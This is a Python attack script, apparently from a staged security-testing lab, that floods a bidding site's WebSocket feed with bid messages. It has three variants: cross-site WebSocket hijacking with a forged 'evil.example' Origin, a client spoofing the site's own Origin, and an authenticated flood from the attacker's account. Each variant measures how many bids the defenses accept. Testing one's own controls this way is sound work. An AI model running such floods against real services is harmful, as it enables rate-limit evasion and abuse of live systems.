"""
Round 4 attack: WebSocket bid flood, three ways.

Open one WebSocket to the live-drop feed and send bid messages as fast as possible. Over a single connection this
is invisible to any HTTP rate limiter: it is one request. Three variants, each beating the control before it:

  cswsh      a forged ``Origin`` of another site and no token: cross-site WebSocket hijacking, as a browser on a
             page the victim visits would open it. The Origin check stops it at the handshake.
  anon       the attacker is not a browser and simply sets ``Origin`` to our own (``--origin-ok``): it passes the
             Origin check, still has no token. The bids are state-changing, so they need authentication.
  authed     the attacker logs in with an account of their own (``--origin-ok --login``) and floods with a valid
             token: nothing but a per-connection message budget stops this one.

At DEFENSE_LEVEL<4 every message is accepted - the flood lands. At level 4 the handshake is refused on Origin,
the bids are rejected, or the bucket empties and the server hangs up.

    python attacks/round4_ws_flood.py [--origin-ok] [--login]
"""

import argparse
import time

from _common import BASE_URL, SCRIPT_UA, ApiApp, bid, bot_ip, finish, open_feed

ACTOR = "bot:r4_ws"
MALLORY = ("mallory@example.test", "mallory-owns-this-1")      # the attacker's own account (contract seed data)


def run(origin_ok=False, login=False, n=200):
    variant = "authed" if login else ("anon" if origin_ok else "cswsh")
    ip = bot_ip(3)
    token = None
    if login:
        app = ApiApp(ACTOR, ip, ua=SCRIPT_UA)
        app.login(*MALLORY)
        token = app.token
    sent = accepted = 0
    connected = False
    t0 = time.perf_counter()
    try:
        with open_feed(ACTOR, ip, origin=BASE_URL if origin_ok else "http://evil.example", token=token, ua=SCRIPT_UA) as ws:
            connected = True
            for _ in range(n):
                reply = bid(ws)
                sent += 1
                if reply is None:
                    break                                    # the server hung up
                if reply.get("event") == "bid_ack":
                    accepted += 1
    except Exception:
        connected = connected and sent > 0
    elapsed = time.perf_counter() - t0
    return finish(f"round4_{variant}", n, accepted, "bids accepted", variant=variant, connected=connected, sent=sent,
                  elapsed_s=round(elapsed, 2), accepted_per_s=round(accepted / elapsed, 1) if elapsed else 0.0)


if __name__ == "__main__":
    ap = argparse.ArgumentParser()
    ap.add_argument("--origin-ok", action="store_true")
    ap.add_argument("--login", action="store_true")
    a = ap.parse_args()
    run(a.origin_ok or a.login, a.login)
